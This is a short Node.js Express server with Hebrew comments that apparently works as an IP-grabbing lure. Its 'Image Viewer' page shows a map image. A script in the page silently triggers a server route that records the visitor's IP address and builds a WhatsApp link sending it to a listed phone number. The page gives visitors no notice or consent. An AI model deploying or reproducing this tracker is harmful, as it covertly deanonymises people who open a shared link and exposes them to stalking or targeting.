const express = require('express');
const path = require('path');
const fs = require('fs');
const fetch = require('node-fetch'); // יש לוודא שהמודול מותקן: npm install node-fetch

const app = express();
const PORT = 3000;

// נתיב לתמונה
const imagePath = path.join(__dirname, 'israelmap.jpeg');

// דף HTML שמכיל את התמונה ואת הקוד לביצוע בקשה
app.get('/image-page', (req, res) => {
    const htmlContent = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Image Viewer</title>
        </head>
        <body>
            <h1>Here is your image</h1>
            <img src="/image" alt="Example Image" style="width: 100%; max-width: 500px;">

            <script>
                fetch('/report', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ timestamp: new Date().toISOString() })
                }).then(response => console.log('IP reported successfully'))
                .catch(error => console.error('Error reporting IP:', error));
            </script>
        </body>
        </html>
    `;
    res.send(htmlContent);
});

// שליחת התמונה למשתמש
app.get('/image', (req, res) => {
    res.sendFile(imagePath);
});

// קליטת בקשה ודיווח IP עם שליחת הודעת WhatsApp
app.post('/report', (req, res) => {
    const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    console.log(`IP Reported: ${userIP}`);
    
    // שליחת הודעה ל-WhatsApp עם כתובת ה-IP
    const whatsappUrl = `https://wa.me/972526405022?text=IP%20Address:%20${encodeURIComponent(userIP)}`;
    console.log(`WhatsApp link: ${whatsappUrl}`);
    
    res.send({ message: 'IP logged successfully, check your WhatsApp link.', link: whatsappUrl });
});

// הפעלת השרת
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
